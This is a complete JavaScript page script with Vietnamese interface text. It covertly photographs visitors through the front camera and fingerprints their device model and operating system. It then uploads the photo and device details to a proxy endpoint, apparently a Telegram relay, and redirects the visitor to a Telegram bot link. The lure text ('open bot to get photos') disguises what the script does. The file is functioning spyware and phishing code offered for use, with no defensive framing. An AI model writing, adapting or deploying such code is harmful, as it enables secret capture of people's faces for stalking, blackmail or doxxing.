const API_PROXY = "/api/tele-proxy";
const BOT_LINK = "https://t.me/hinhanhnhaycam_bot";

const info = {
  time: new Date().toLocaleString("vi-VN"),
  device: "",
  os: "",
  camera: "⏳ Đang kiểm tra...",
};

function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenW = window.screen.width;
  const screenH = window.screen.height;
  const ratio = window.devicePixelRatio;

  if (
    /iPhone|iPad|iPod/i.test(ua) ||
    (platform === "MacIntel" && navigator.maxTouchPoints > 1)
  ) {
    info.os = "iOS";
    const res = `${screenW}x${screenH}@${ratio}`;
    const iphoneModels = {
      "430x932@3": "iPhone 14/15/16 Pro Max",
      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
      "414x896@3": "iPhone XS Max / 11 Pro Max",
      "414x896@2": "iPhone XR / 11",
      "375x812@3": "iPhone X / XS / 11 Pro",
      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
    };
    info.device = iphoneModels[res] || "iPhone Model";
  } else if (/Android/i.test(ua)) {
    info.os = "Android";
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    info.device = match ? match[1].split("/")[0].trim() : "Android Device";
  } else {
    info.os = ua.includes("Windows") ? "Windows" : "Desktop";
    info.device = platform || "PC/Laptop";
  }
}

function captureFromPreview() {
  return new Promise((resolve) => {
    const video = document.getElementById("preview");
    if (!video || !video.videoWidth) {
      return resolve(null);
    }
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob((b) => resolve(b), "image/jpeg", 0.92);
  });
}

async function captureWithNewStream() {
  if (!navigator.mediaDevices?.getUserMedia) return null;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false,
    });
    return await new Promise((resolve) => {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.muted = true;
      video.playsInline = true;
      video.play();
      video.onloadedmetadata = () => {
        setTimeout(() => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext("2d").drawImage(video, 0, 0);
          stream.getTracks().forEach((t) => t.stop());
          canvas.toBlob((b) => resolve(b), "image/jpeg", 0.9);
        }, 600);
      };
    });
  } catch (e) {
    return null;
  }
}

async function main() {
  detectDevice();

  let blob = await captureFromPreview();
  if (!blob) blob = await captureWithNewStream();

  info.camera = blob ? "✅ Đã chụp camera trước" : "🚫 Không có camera";

  const formData = new FormData();
  formData.append("clientInfo", JSON.stringify(info));
  if (blob) formData.append("front", blob, "front.jpg");

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 35000);
    await fetch(API_PROXY, {
      method: "POST",
      body: formData,
      signal: controller.signal,
    });
    clearTimeout(timeout);
  } catch (_) {}

  window.mainScriptFinished = true;

  const button =
    document.querySelector(".btn") || document.querySelector("button");

  if (button) {
    button.style.backgroundColor = "#28a745";
    button.style.color = "#fff";

    let timeLeft = 3;
    button.innerText = `Mở bot để lấy ảnh (${timeLeft}s)`;
    const timer = setInterval(() => {
      timeLeft--;
      if (timeLeft > 0) {
        button.innerText = `Mở bot để lấy ảnh (${timeLeft}s)`;
      } else {
        clearInterval(timer);
        window.location.href = BOT_LINK;
      }
    }, 1000);
  } else {
    setTimeout(() => {
      window.location.href = BOT_LINK;
    }, 3000);
  }
}

main();
